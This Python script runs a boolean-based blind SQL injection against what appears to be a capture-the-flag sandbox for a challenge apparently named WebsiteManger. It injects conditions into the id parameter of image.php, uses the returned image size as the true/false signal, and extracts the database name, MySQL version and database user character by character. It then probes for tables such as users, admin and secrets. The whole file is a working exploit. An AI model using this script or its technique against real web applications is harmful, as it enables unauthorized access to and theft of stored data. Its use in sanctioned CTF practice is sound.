#!/usr/bin/env python3
"""Boolean-based blind SQLi for WebsiteManger."""
import requests
import urllib.parse
import string

TARGET = "http://challenge-ab97d555c14efe7b.sandbox.ctfhub.com:10800"
IMAGE_SIZE = 6106  # Size when condition is TRUE

def test(condition):
    """Test a boolean condition. Returns True if image is returned."""
    payload = f"1&&({condition})"
    url = f"{TARGET}/image.php?id={urllib.parse.quote(payload)}"
    try:
        r = requests.get(url, timeout=10)
        return len(r.content) == IMAGE_SIZE
    except:
        return False

# First, verify SELECT works
print("Testing basic SELECT...")
print("  (select 1)=1:", test("(select 1)=1"))
print("  (select 1)=2:", test("(select 1)=2"))
print("  database()='ctf':", test("database()='ctf'"))
print("  length(database())=3:", test("length(database())=3"))

# Extract database name
print("\nExtracting database name...")
db_name = ""
for pos in range(1, 20):
    found = False
    for c in string.ascii_lowercase + string.digits + '_':
        cond = "substr(database(),%d,1)='%s'" % (pos, c)
        if test(cond):
            db_name += c
            found = True
            break
    if not found:
        break
print("  Database:", db_name)

# Check MySQL version
print("\nExtracting version...")
ver = ""
for pos in range(1, 20):
    found = False
    for c in string.digits + '.':
        cond = "substr(version(),%d,1)='%s'" % (pos, c)
        if test(cond):
            ver += c
            found = True
            break
    if not found:
        break
print("  Version:", ver)

# Extract current user
print("\nExtracting user...")
user = ""
for pos in range(1, 40):
    found = False
    for c in string.ascii_lowercase + string.digits + '_@%':
        cond = "substr(user(),%d,1)='%s'" % (pos, c)
        if test(cond):
            user += c
            found = True
            break
    if not found:
        break
print("  User:", user)

# Try to list tables from information_schema
print("\nSearching for tables...")
info_ok = test("(select count(*) from information_schema.tables)>0")
print("  information_schema accessible:", info_ok)

# Try common table names
for table in ['users', 'user', 'flag', 'flags', 'images', 'image', 'admin',
              'config', 'secrets', 'website', 'sites', 'test', 'manager']:
    exists = test("(select count(*) from %s)>=0" % table)
    if exists:
        # Get row count
        row_count = 0
        for i in range(10):
            if not test("(select count(*) from %s)>%d" % (table, i)):
                row_count = i
                break
        print("  Table '%s': EXISTS, %d rows" % (table, row_count))

print("\nDone!")
